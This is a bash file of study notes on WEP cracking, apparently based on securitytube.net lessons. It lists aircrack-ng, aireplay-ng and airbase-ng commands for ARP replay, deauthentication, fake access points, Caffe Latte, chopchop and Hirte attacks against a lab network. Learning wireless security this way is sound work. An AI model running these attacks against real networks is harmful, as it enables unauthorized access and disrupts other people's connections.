#!/bin/bash

#-----------------------------------------------#
#	securitytube.net wep attacks
#-----------------------------------------------#



#-----------------------------------------------#
#	arp replay
#-----------------------------------------------#

# 1 - use airodump to scan a bssid and save packets to file
airodump-ng --channel 1 mon0 --write wepcracking --bssid 00:21:91:D2:8E:25

#-----------------------------------------------#

# 2 - aireplay-ng --arpreplay attack using mac address of client connect to AP
aireplay-ng -3 -e Pwnme -h 60:FB:42:D5:E4:01 mon0

# -3 = --arpreplay attack
# -e Pwnme = bssid
# -h 60:FB:42:D5:E4:01

# or do a fake auth to the AP
aireplay-ng -1 0 -a 00:1F:33:F0:53:45 mon0

#-----------------------------------------------#

# 3 - generate data packets with a deauth
aireplay-ng -0 -e Pwnme mon0

# -0 = deauth attack
# -e Pwnme = essid ( network name )

#-----------------------------------------------#

# 4 - aircrack-ng to crack the wep key
aircrack-ng wepcracking-01.cap


#-----------------------------------------------#
#	Message Injenction attacks
#-----------------------------------------------#


# homeypot

# scan - find client sending out probe request for networks ( encryped networks )
airodump-ng --channel 1 mon0

#-----------------------------------------------#

# airbase-ng create fake AP and set wep flag
airbase-ng -W 1 --essid PwnME -c 1 mon0

# -W 1 = set wep flag
# --essid PwnME = network essid
# -c 1 = channel 1

#-----------------------------------------------#

# open wireshark start sniffing on mon0

# select the bssid in wireshark and apply a filter for the bssid
# select beacon frames and apply a filter not selected to filter out the beacon frames

#-----------------------------------------------#
# client connects to our spoofed AP
#-----------------------------------------------#



#-----------------------------------------------#
#	Caffe Latte
#-----------------------------------------------#


# airbase-ng create fake AP and set wep flag
airbase-ng -W 1 --essid PwnME -c 1 mon0

# -W 1 = set wep flag
# --essid PwnME = network essid
# -c 1 = channel 1

#-----------------------------------------------#

# open wireshark start sniffing on mon0 for PwnMe

# select the bssid in wireshark and apply a filter for the bssid
# select data frames and apply a filter and selected

#-----------------------------------------------#

# client connect to Pwnme network
# dhcp times out

#-----------------------------------------------#

# caffee latte attack

airbase-ng -W 1 --essid PwnME -c 1 -L -x 10 mon0

# -W 1 = set wep flag
# --essid PwnME = network essid
# -c 1 = channel 1
# l = caffee latte attack
# x = rate limit number of packet per seconds

#-----------------------------------------------#

# scan with airodump
airodump-ng --channel 1 --bssid 00:21:91:D2:8E:25 --write CaffeLatte-Demo mon0

# --channel 1 = channel 1
# --bssid 00:21:91:D2:8E:25 = network bssid
# --write CaffeLatte-Demo = write to file

#-----------------------------------------------#




#-----------------------------------------------#
#	Korek ChopChop
#-----------------------------------------------#


aireplay-ng -4 -e PwnMe mono

# -4 = chopchop
# - e PwnMe = essid of AP


# select a packet to use


# it saves a cap file and a xor file

#-----------------------------------------------#

wireshark replay-01.cap &

# open wireshark and sniff on mon0

# select the PwnMe network and apply a filter seclected
# then slect a beacon frame and apply a filter not selected


#-----------------------------------------------#
# fragmentation attacks
#-----------------------------------------------#


#-----------------------------------------------#
#	hirte attack
#-----------------------------------------------#

airbase-ng -c 1 --essid PwnMe -W 1 -N mon0 


# -c 1 = channel 1 
# --essid PwnME = essid of AP
# -W 1 = set thte encryption bit to WEP
# mon0 = network interface in monitor mode
# -N = hirte attack

#-----------------------------------------------#

airodump-ng --channel 1 mon0 --write Hirte

#-----------------------------------------------#

aircrack-ng Hirte-01.cap





